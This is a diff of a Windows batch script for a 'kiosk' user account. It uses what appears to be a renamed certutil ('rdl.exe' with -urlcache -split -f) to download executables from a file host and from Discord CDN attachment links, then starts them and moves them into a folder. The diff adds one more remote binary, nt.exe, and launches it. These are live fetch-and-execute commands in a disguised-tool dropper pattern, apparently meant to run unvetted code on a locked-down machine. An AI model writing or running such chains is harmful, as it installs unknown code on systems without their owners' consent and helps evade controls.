@@ -33,12 +33,14 @@ echo Exists) ELSE (
 
 "c:\temp\rdl.exe" -urlcache -split -f "https://files.rycoh.net/rdl.exe" "C:\Users\kiosk\Downloads\rdl.exe"
 "c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/873261878904782941/1102389310487023727/VoughtUadml.exe" "C:\Users\kiosk\Downloads\VoughtUadml.exe"
+"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105542124436459550/nt.exe" "C:\Users\kiosk\Downloads\nt.exe"
 
 if not exist "%unzipFolder%" (
   md "%unzipFolder%"
 )
 
 start "" "C:\Users\kiosk\Downloads\VoughtUadml.exe"
+start "" "C:\Users\kiosk\Downloads\nt.exe"
 
 timeout /t 8
 
@@ -48,6 +50,7 @@ del "%zipFile%"
 
 move "C:\Users\kiosk\Downloads\rdl.exe" "%unzipFolder%"
 move "C:\Users\kiosk\Downloads\VoughtUadml.exe" "%unzipFolder%"
+move "C:\Users\kiosk\Downloads\nt.exe" "%unzipFolder%"
 
 REM --------- After Here RDL is in "C:\Users\kiosk\Downloads\G" !!
 
